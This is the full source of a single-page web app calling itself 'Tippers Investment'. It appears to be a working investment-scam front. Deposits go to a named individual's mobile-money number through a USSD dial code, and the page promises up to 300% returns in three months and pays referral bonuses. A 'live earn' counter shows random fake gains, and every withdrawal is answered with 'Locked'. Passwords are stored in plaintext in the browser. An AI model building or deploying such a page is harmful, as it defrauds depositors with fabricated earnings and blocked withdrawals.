<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Tippers Investment</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">

<style>
body{
margin:0;
font-family:Segoe UI;
background:#0b1120;
display:flex;
justify-content:center;
align-items:center;
height:100vh;
}

.app{
width:380px;
background:#000;
border-radius:20px;
overflow:hidden;
color:white;
display:flex;
flex-direction:column;
}

.content{
padding:20px;
height:520px;
overflow-y:auto;
}

.title{color:#f59e0b;text-align:center;font-weight:bold;}
.desc{text-align:center;margin-top:10px;}

input,select{
width:100%;
padding:10px;
margin-top:8px;
border-radius:8px;
border:none;
background:#0f172a;
color:white;
}

button{
width:100%;
padding:12px;
margin-top:15px;
border:none;
border-radius:10px;
background:linear-gradient(135deg,#f59e0b,#f97316);
color:white;
font-weight:bold;
cursor:pointer;
}

.row{display:flex;gap:5px;}

.nav{
display:flex;
justify-content:space-around;
background:#020617;
padding:10px;
}

.nav div{text-align:center;cursor:pointer;}
.nav i{display:block;font-size:20px;margin-bottom:3px;}

#toast{
position:fixed;
bottom:20px;
left:50%;
transform:translateX(-50%);
background:red;
color:white;
padding:10px;
border-radius:8px;
display:none;
}

.card{
background:#111;
padding:15px;
border-radius:12px;
margin-top:10px;
word-break:break-all;
}
</style>
</head>

<body>

<div class="app">
<div class="content" id="screen"></div>

<div class="nav" id="nav" style="display:none">
<div onclick="home()"><i class="fa fa-home"></i>HOME</div>
<div onclick="deposit()"><i class="fa fa-wallet"></i>DEPOSIT</div>
<div onclick="earn()"><i class="fa fa-chart-line"></i>EARN</div>
<div onclick="withdraw()"><i class="fa fa-money-bill"></i>WITHDRAW</div>
</div>
</div>

<div id="toast"></div>

<script>

/* STATE */
let users = JSON.parse(localStorage.getItem("users")) || [];
let currentUser = JSON.parse(localStorage.getItem("currentUser")) || null;

let amount = 0;
let selectedPeriod = 0;
let referralBonus = 60000;

const screen=document.getElementById("screen");
const nav=document.getElementById("nav");

/* TOAST */
function toast(msg){
let t=document.getElementById("toast");
t.innerText=msg;
t.style.display="block";
setTimeout(()=>t.style.display="none",2500);
}

/* REF CODE */
function genCode(){
return "REF"+Math.floor(Math.random()*1000000);
}

/* START */
function start(){
nav.style.display="none";

screen.innerHTML=`
<h2 class="title">WELCOME TO TIPPERS INVESTMENT APP !</h2>
<button onclick="register()">START</button>
`;
}

/* REGISTER */
function register(){

let ref = new URLSearchParams(window.location.search).get("ref");

screen.innerHTML=`
<h3 class="title">REGISTER</h3>

<input id="f" placeholder="First name">
<input id="l" placeholder="Last name">

<input id="email" placeholder="Email">
<input id="pass" placeholder="6 digit password">
<input id="cpass" placeholder="Confirm password">

<button onclick="doRegister('${ref || ""}')">REGISTER</button>
`;
}

/* REGISTER SAVE */
function doRegister(ref){

if(pass.value!==cpass.value){
toast("Passwords do not match ❌"); return;
}

let myCode = genCode();

let user={
email:email.value,
pass:pass.value,
refCode:myCode,
balance:0,
referrals:[],
invitedBy: ref || null
};

users.push(user);
localStorage.setItem("users",JSON.stringify(users));

toast("Registered ✔");
login();
}

/* LOGIN */
function login(){
screen.innerHTML=`
<h3 class="title">LOGIN</h3>

<input id="le">
<input id="lp">

<button onclick="doLogin()">LOGIN</button>
`;
}

function doLogin(){

let user = users.find(u=>u.email===le.value);

if(!user || user.pass!==lp.value){
toast("Wrong login ❌"); return;
}

currentUser=user;
localStorage.setItem("currentUser",JSON.stringify(user));

nav.style.display="flex";
deposit();
}

/* SHARE LINK */
function shareLink(){
let link = window.location.origin + "?ref=" + currentUser.refCode;

if(navigator.share){
navigator.share({
title:"Join Investment App",
text:"Register using my link",
url:link
});
}else{
navigator.clipboard.writeText(link);
toast("Link copied ✔");
}
}

/* DEPOSIT */
function deposit(){

let link = window.location.origin + "?ref=" + currentUser.refCode;

screen.innerHTML=`
<h3 class="title">DEPOSIT</h3>

<input id="amt" placeholder="Amount">
<input id="sender" placeholder="Sender">

<button onclick="goPayment()">CONTINUE</button>

<div class="card">
Referral link:<br>
${link}
</div>

<button onclick="shareLink()">SHARE LINK</button>
`;
}

function goPayment(){
amount=parseInt(amt.value);
payment();
}

/* PAYMENT */
function payment(){
screen.innerHTML=`
<h3 class="title">PAYMENT</h3>

<div class="card">
0795410739<br>
BARAKA BOLINGO
</div>

<button onclick="dial()">DIAL</button>
`;
}

function dial(){
screen.innerHTML=`
<p>*182*1*1*0795410739#</p>

<input type="file" id="file">

<button onclick="submitProof()">SUBMIT</button>
`;
}

/* BONUS LOGIC */
function submitProof(){
if(!file.value){
toast("Upload proof ❌"); return;
}

/* BONUS */
if(amount >= 1000000){
giveBonus();
}

withdrawPeriod();
}

function giveBonus(){

let inviterCode = currentUser.invitedBy;

if(!inviterCode) return;

let inviter = users.find(u=>u.refCode===inviterCode);

if(inviter){
inviter.balance = (inviter.balance || 0) + referralBonus;

localStorage.setItem("users",JSON.stringify(users));

toast("Referral bonus +60000 ✔");
}
}

/* WITHDRAW PERIOD */
function withdrawPeriod(){
screen.innerHTML=`
<h3 class="title">PERIOD</h3>

<select id="period">
<option value="1">1day</option>
<option value="7">7days</option>
<option value="14">14days</option>
<option value="45">45days</option>
<option value="90">3months</option>
</select>

<button onclick="finish()">CONFIRM</button>
`;
}

/* PROFIT */
function calculateProfit(a,p){

let rate=0;
if(p==1) rate=0.05;
if(p==7) rate=0.2;
if(p==14) rate=0.45;
if(p==45) rate=1.2;
if(p==90) rate=3;

return Math.floor(a+(a*rate));
}

/* FINISH */
function finish(){
selectedPeriod=period.value;

let final=calculateProfit(amount,selectedPeriod);

screen.innerHTML=`
<div class="card">
<h2>FINAL BALANCE</h2>
<h1>${final} RWF</h1>
</div>
`;
}

/* HOME */
function home(){

let u = users.find(x=>x.email===currentUser.email);

screen.innerHTML=`
<div class="card">
<h2>Balance</h2>
<h1>${u.balance || 0} RWF</h1>
</div>
`;
}

/* EARN */
function earn(){
screen.innerHTML=`
<h3 class="title">LIVE EARN</h3>
<div class="card"><h1 id="live">0</h1></div>
`;

let i=0;
setInterval(()=>{
i+=Math.floor(Math.random()*2000);
document.getElementById("live").innerText=i+" RWF";
},1000);
}

/* WITHDRAW */
function withdraw(){
screen.innerHTML=`
<h3 class="title">WITHDRAW</h3>

<input id="wamt">

<button onclick="doWithdraw()">WITHDRAW</button>
`;
}

function doWithdraw(){
toast("Locked ❌");
}

start();

</script>

</body>
</html>
